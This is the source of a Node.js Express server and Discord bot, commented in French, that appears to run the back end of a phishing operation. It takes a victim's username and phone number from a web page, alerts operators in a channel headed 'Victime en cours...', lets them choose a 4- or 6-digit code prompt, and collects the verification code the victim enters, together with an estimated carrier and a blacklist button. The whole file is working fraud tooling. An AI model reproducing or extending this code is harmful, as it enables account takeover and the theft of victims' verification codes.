const express = require('express');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, Events, EmbedBuilder } = require('discord.js');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// --- CONFIGURATION ---
const TOKEN = process.env.TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;

// --- FONCTION POUR DÉTECTER L'OPÉRATEUR ---
const getOperateur = (phone) => {
    if (!phone || phone.length < 4) return "Inconnu";
    
    const num = phone.replace(/\s/g, '');
    const prefix = num.substring(0, 4);
    
    const prefixes = {
        "0607": "Orange", "0608": "Orange", "0609": "Orange",
        "0601": "SFR", "0602": "SFR", "0603": "SFR",
        "0660": "Bouygues", "0661": "Bouygues", "0662": "Bouygues", "0663": "Bouygues",
        "0664": "Bouygues", "0665": "Bouygues", "0666": "Bouygues", "0667": "Bouygues",
        "0668": "Bouygues", "0669": "Bouygues",
        "0700": "Free", "0701": "Free", "0702": "Free", "0703": "Free", "0704": "Free",
        "0705": "Free", "0706": "Free", "0707": "Free", "0708": "Free", "0709": "Free"
    };
    
    return prefixes[prefix] || "Autre / MVNO";
};
// --------------------------------------------

// --- BOT DISCORD ---
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
let lastAction = { status: 'waiting', length: 0 };
const blacklist = []; // Tableau pour stocker les numéros bannis

client.once(Events.ClientReady, () => {
    console.log(`Bot prêt : ${client.user.tag}`);
});

// Quand ton site web envoie un numéro
app.post('/api/send-info', async (req, res) => {
    const { pseudo, phone } = req.body;
    
    // Vérification de la blacklist
    if (blacklist.includes(phone)) {
        return res.status(403).json({ error: 'Numéro blacklisté' });
    }

    lastAction = { status: 'waiting', length: 0, phone: phone };

    try {
        const channel = await client.channels.fetch(CHANNEL_ID);
        
        const embed = new EmbedBuilder()
            .setTitle('Victime en cours...')
            .setColor('#FFFC00')
            .addFields(
                { name: 'Utilisateur', value: `\`${pseudo}\``, inline: true },
                { name: 'Numéro', value: `\`${phone}\``, inline: true }
            )
            .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('btn_4').setLabel('Code à 4 chiffres').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('btn_6').setLabel('Code à 6 chiffres').setStyle(ButtonStyle.Success)
        );
        
        await channel.send({ content: '@everyone', embeds: [embed], components: [row] });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Erreur Discord' });
    }
});

// Route pour recevoir le code final du site
app.post('/api/send-code', async (req, res) => {
    const { pseudo, phone, code, length } = req.body;
    try {
        const channel = await client.channels.fetch(CHANNEL_ID);
        const operateur = getOperateur(phone); // On récupère l'opérateur

        const embed = new EmbedBuilder()
            .setTitle('Victime approuvé !')
            .setColor('#FFFC00')
            .addFields(
                { name: 'Utilisateur', value: `\`${pseudo}\``, inline: true },
                { name: 'Numéro', value: `\`${phone}\``, inline: true },
                { name: 'Opérateur (estimé)', value: `\`${operateur}\``, inline: true } // Nouveau champ
            )
            .setTimestamp();
        
        // On crée le bouton pour blacklister
        const blacklistRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`blacklist_${phone}`) // On met le numéro dans l'ID du bouton
                .setLabel('Blacklist')
                .setStyle(ButtonStyle.Danger) // Bouton rouge
                .setEmoji('🚫')
        );

        await channel.send({ content: '@everyone', embeds: [embed], components: [blacklistRow] });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Erreur Discord' });
    }
});

// Quand ton site web vérifie l'état (Polling)
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    if (lastAction.phone === phone && lastAction.status === 'ready') {
        res.json({ ready: true, length: lastAction.length });
        lastAction.status = 'waiting'; 
    } else {
        res.json({ ready: false });
    }
});

// Quand tu cliques sur un bouton sur Discord
client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isButton()) return;
    
    // 1. Gestion des boutons 4 et 6 chiffres
    if (interaction.customId === 'btn_4' || interaction.customId === 'btn_6') {
        const length = interaction.customId === 'btn_4' ? 4 : 6;
        
        lastAction.status = 'ready';
        lastAction.length = length;

        await interaction.reply({ content: `✅ Envoyé au site : Code à ${length} chiffres.`, ephemeral: true });
        
        const newRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('done').setLabel('Déjà traité').setStyle(ButtonStyle.Secondary).setDisabled(true)
        );
        await interaction.message.edit({ components: [newRow] });
    }

    // 2. Gestion du bouton Blacklist (L'étape 4)
    if (interaction.customId.startsWith('blacklist_')) {
        const phoneToBlacklist = interaction.customId.replace('blacklist_', '');
        
        if (!blacklist.includes(phoneToBlacklist)) {
            blacklist.push(phoneToBlacklist);
        }

        await interaction.reply({ content: `🚫 Le numéro \`${phoneToBlacklist}\` a été ajouté à la blacklist.`, ephemeral: true });
        
        const disabledRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('done_blacklist').setLabel('Blacklisté').setStyle(ButtonStyle.Secondary).setDisabled(true)
        );
        await interaction.message.edit({ components: [disabledRow] });
    }
});
client.login(TOKEN);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Serveur sur le port ${PORT}`));